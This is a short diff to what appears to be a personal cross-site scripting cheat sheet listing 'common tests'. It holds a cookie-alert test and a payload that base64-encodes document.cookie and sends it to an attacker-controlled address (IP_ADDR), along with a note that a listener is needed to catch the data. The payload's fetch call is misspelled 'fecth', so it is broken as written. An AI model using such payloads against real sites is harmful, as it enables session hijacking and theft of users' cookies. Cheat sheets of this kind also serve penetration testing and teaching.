@@ -95,7 +95,7 @@ COMMON TESTS:
 
 <script>alert(document.cookie);</script> || NORMAL TEST TO RETRIEVE COOKIES
 
-fecth('http://IP_ADDR/${btoa(document.cookie)}') || STOLE ENCODED BASE64 COOKIE, SENT TO ATTACKER MACHINE
+<script>fecth('http://IP_ADDR/${btoa(document.cookie)}');</script> || STOLE ENCODED BASE64 COOKIE, SENT TO ATTACKER MACHINE
 *for this to work, it is needed a python server or any listener to retrieve the content.
 
 </p>
